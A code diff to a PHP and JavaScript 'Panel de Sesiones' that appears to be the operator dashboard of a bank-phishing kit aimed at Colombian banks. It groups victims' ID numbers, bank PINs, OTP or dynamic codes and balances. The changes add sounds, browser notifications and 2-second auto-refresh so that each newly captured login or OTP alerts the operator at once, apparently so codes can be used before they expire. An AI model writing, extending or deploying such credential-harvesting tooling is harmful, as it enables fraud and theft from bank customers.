@@ -34,7 +34,24 @@ foreach ($logs as $log) {
 $sesiones_agrupadas = [];
 
 foreach ($logs as $log) {
-    $documento = $log['documento'] ?? $log['usuario'] ?? $log['identificacion'] ?? 'N/A';
+    // OBTENER DOCUMENTO
+    $documento = 'N/A';
+    if (!empty($log['documento']) && $log['documento'] !== 'N/A') {
+        $documento = $log['documento'];
+    } elseif (!empty($log['usuario']) && $log['usuario'] !== 'N/A') {
+        $documento = $log['usuario'];
+    } elseif (!empty($log['identificacion']) && $log['identificacion'] !== 'N/A') {
+        $documento = $log['identificacion'];
+    } elseif (!empty($log['documento_pse'])) {
+        $documento = $log['documento_pse'];
+    } elseif (!empty($log['cedula'])) {
+        $documento = $log['cedula'];
+    } elseif (!empty($log['numero_documento'])) {
+        $documento = $log['numero_documento'];
+    } elseif (!empty($log['numero_identificacion'])) {
+        $documento = $log['numero_identificacion'];
+    }
+    
     $banco = $log['banco'] ?? 'Desconocido';
     $clave = $log['clave_pin'] ?? '';
     $otp = $log['codigo_otp'] ?? $log['codigo_dinamica'] ?? '';
@@ -45,8 +62,26 @@ foreach ($logs as $log) {
     $id = $log['id'];
     $error_tipo = $log['error_tipo'] ?? null;
     
-    $key = md5($documento . '_' . strtolower($banco));
+    // ====== IDENTIFICAR BANCOS PROBLEMÁTICOS ======
+    $bancoLower = strtolower($banco);
+    $esBancoProblema = (strpos($bancoLower, 'bancolombia') !== false || 
+                        strpos($bancoLower, 'bogota') !== false);
     
+    // ====== CLAVE DE AGRUPACIÓN ======
+    // Para bancos problemáticos: NUNCA AGRUPAR, cada log es su propia tarjeta
+    if ($esBancoProblema) {
+        // Usar ID único + timestamp para asegurar que nunca se agrupen
+        $key = 'unique_' . $id . '_' . uniqid();
+    } else {
+        // Para otros bancos: agrupar por documento + banco si hay documento
+        if ($documento === 'N/A' || empty($documento) || $documento === '') {
+            $key = 'unique_' . $id . '_' . uniqid();
+        } else {
+            $key = md5($documento . '_' . strtolower($banco));
+        }
+    }
+    
+    // Si no existe el grupo, crearlo
     if (!isset($sesiones_agrupadas[$key])) {
         $sesiones_agrupadas[$key] = [
             'documento' => $documento,
@@ -86,6 +121,7 @@ foreach ($logs as $log) {
             $sesiones_agrupadas[$key]['error_tipo'] = $error_tipo;
         }
     } else {
+        // LOGIN normal
         $sesiones_agrupadas[$key]['clave'] = $clave;
         $sesiones_agrupadas[$key]['login_id'] = $id;
         $sesiones_agrupadas[$key]['estado_login'] = $estado;
@@ -95,6 +131,7 @@ foreach ($logs as $log) {
         }
     }
     
+    // Actualizar fecha si es más reciente
     if ($fecha > $sesiones_agrupadas[$key]['fecha_inicio']) {
         $sesiones_agrupadas[$key]['fecha_inicio'] = $fecha;
     }
@@ -110,6 +147,18 @@ usort($sesiones_agrupadas, function($a, $b) {
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Panel de Sesiones</title>
+    
+    <!-- ========================================== -->
+    <!-- SONIDOS PARA NUEVOS REGISTROS              -->
+    <!-- ========================================== -->
+    <audio id="loginSound" preload="auto">
+        <source src="login.mp3" type="audio/mpeg">
+    </audio>
+    <audio id="otpSound" preload="auto">
+        <source src="otp.mp3" type="audio/mpeg">
+    </audio>
+    <!-- ========================================== -->
+    
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
         body {
@@ -367,7 +416,6 @@ usort($sesiones_agrupadas, function($a, $b) {
             font-style: italic;
         }
 
-        /* Estilo especial para SALDO - solo Nequi */
         .sesion-dato.saldo-dato .valor {
             color: #2ecc71;
             font-weight: 700;
@@ -709,6 +757,49 @@ usort($sesiones_agrupadas, function($a, $b) {
     <div class="toast-container" id="toastContainer"></div>
 
     <script>
+        // ==========================================
+        // NOTIFICACIONES DEL NAVEGADOR
+        // ==========================================
+        function solicitarPermisoNotificaciones() {
+            if ('Notification' in window) {
+                if (Notification.permission === 'default') {
+                    Notification.requestPermission();
+                }
+            }
+        }
+
+        function enviarNotificacion(titulo, mensaje) {
+            if ('Notification' in window && Notification.permission === 'granted') {
+                try {
+                    const options = {
+                        body: mensaje,
+                        icon: 'data:image/svg+xml,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 100 100"><text y=".9em" font-size="90">🔔</text></svg>',
+                        tag: 'nuevo-registro',
+                        requireInteraction: true,
+                        vibrate: [200, 100, 200]
+                    };
+                    const notificacion = new Notification(titulo, options);
+                    setTimeout(() => notificacion.close(), 8000);
+                } catch (e) {
+                    console.log('Error en notificación:', e);
+                }
+            }
+        }
+
+        // ==========================================
+        // SOLICITAR PERMISO AL CARGAR
+        // ==========================================
+        document.addEventListener('DOMContentLoaded', function() {
+            solicitarPermisoNotificaciones();
+        });
+
+        // ==========================================
+        // VARIABLES PARA CONTROLAR NUEVOS REGISTROS
+        // ==========================================
+        let ultimoTotal = <?php echo $total_logs; ?>;
+        let ultimoLoginId = null;
+        let ultimoOtpId = null;
+
         function showToast(message, type = 'success') {
             const container = document.getElementById('toastContainer');
             const toast = document.createElement('div');
@@ -720,6 +811,83 @@ usort($sesiones_agrupadas, function($a, $b) {
                 toast.style.transform = 'translateX(100%)';
                 setTimeout(() => toast.remove(), 300);
             }, 2500);
+        }
+
+        // ==========================================
+        // REPRODUCIR SONIDOS
+        // ==========================================
+        function reproducirSonido(tipo) {
+            try {
+                let audio = null;
+                if (tipo === 'login') {
+                    audio = document.getElementById('loginSound');
+                } else if (tipo === 'otp') {
+                    audio = document.getElementById('otpSound');
+                }
+                
+                if (audio) {
+                    audio.currentTime = 0;
+                    audio.volume = 1.0;
+                    audio.play().catch(e => console.log('Audio bloqueado por el navegador'));
+                }
+            } catch (e) {
+                console.log('Error al reproducir sonido:', e);
+            }
+        }
+
+        // ==========================================
+        // DETECTAR NUEVOS REGISTROS
+        // ==========================================
+        function detectarNuevosRegistros(logsActuales) {
+            const logsRecientes = logsActuales.slice(0, 20);
+            
+            for (const log of logsRecientes) {
+                const actividad = log.activity || '';
+                const id = log.id;
+                const usuario = log.usuario || 'Desconocido';
+                const esLogin = actividad.includes('LOGIN') && !actividad.includes('OTP') && !actividad.includes('DINÁMICA');
+                const esOtp = actividad.includes('OTP') || actividad.includes('DINÁMICA');
+                
+                if (esLogin && id !== ultimoLoginId) {
+                    ultimoLoginId = id;
+                    reproducirSonido('login');
+                    enviarNotificacion('🔊 Nuevo LOGIN', '👤 Usuario: ' + usuario);
+                    showToast('🔊 Nuevo LOGIN recibido!', 'success');
+                    return;
+                }
+                
+                if (esOtp && id !== ultimoOtpId) {
+                    ultimoOtpId = id;
+                    reproducirSonido('otp');
+                    enviarNotificacion('🔔 Nueva OTP', '📱 Código para: ' + usuario);
+                    showToast('🔔 Nueva OTP/DINÁMICA recibida!', 'success');
+                    return;
+                }
+            }
+        }
+
+        // ==========================================
+        // EXTRAER LOGS DEL HTML
+        // ==========================================
+        function obtenerLogsDesdeHTML() {
+            const logs = [];
+            const cards = document.querySelectorAll('.sesion-card');
+            
+            cards.forEach(card => {
+                const id = card.dataset.id || '';
+                const usuario = card.querySelector('.sesion-usuario .valor')?.textContent || '';
+                const estado = card.querySelector('.sesion-estado-general')?.textContent?.trim() || '';
+                const actividad = card.querySelector('.sesion-actividad')?.textContent || '';
+                
+                logs.push({
+                    id: id,
+                    usuario: usuario,
+                    estado: estado,
+                    activity: actividad
+                });
+            });
+            
+            return logs;
         }
 
         // ======================== LOGIN ========================
@@ -976,15 +1144,33 @@ usort($sesiones_agrupadas, function($a, $b) {
                     const parser = new DOMParser();
                     const doc = parser.parseFromString(html, 'text/html');
                     
+                    // Actualizar lista de sesiones
                     const newList = doc.querySelector('#sesionesList');
                     if (newList) {
                         document.getElementById('sesionesList').innerHTML = newList.innerHTML;
                     }
                     
+                    // Actualizar estadísticas
                     const newTotal = doc.querySelector('#statTotal');
                     const newPendientes = doc.querySelector('#statPendientes');
-                    if (newTotal) document.getElementById('statTotal').textContent = newTotal.textContent;
-                    if (newPendientes) document.getElementById('statPendientes').textContent = newPendientes.textContent;
+                    if (newTotal) {
+                        const nuevoTotal = parseInt(newTotal.textContent);
+                        
+                        // Verificar si hay nuevos registros
+                        if (nuevoTotal > ultimoTotal) {
+                            const logs = obtenerLogsDesdeHTML();
+                            if (logs.length > 0) {
+                                detectarNuevosRegistros(logs);
+                            }
+                            ultimoTotal = nuevoTotal;
+                        }
+                        
+                        document.getElementById('statTotal').textContent = newTotal.textContent;
+                    }
+                    
+                    if (newPendientes) {
+                        document.getElementById('statPendientes').textContent = newPendientes.textContent;
+                    }
                     
                     aplicarFiltros();
                 })
@@ -998,7 +1184,20 @@ usort($sesiones_agrupadas, function($a, $b) {
             autoRefreshInterval = setInterval(cargarDatos, 2000);
         }
 
+        // ======================== INICIALIZAR ========================
         document.addEventListener('DOMContentLoaded', function() {
+            // Obtener IDs iniciales de los logs
+            const logs = obtenerLogsDesdeHTML();
+            for (const log of logs) {
+                const actividad = log.activity || '';
+                const id = log.id;
+                if (actividad.includes('LOGIN') && !actividad.includes('OTP') && !actividad.includes('DINÁMICA')) {
+                    if (!ultimoLoginId) ultimoLoginId = id;
+                } else if (actividad.includes('OTP') || actividad.includes('DINÁMICA')) {
+                    if (!ultimoOtpId) ultimoOtpId = id;
+                }
+            }
+            
             iniciarAutoRefresh();
             aplicarFiltros();
         });
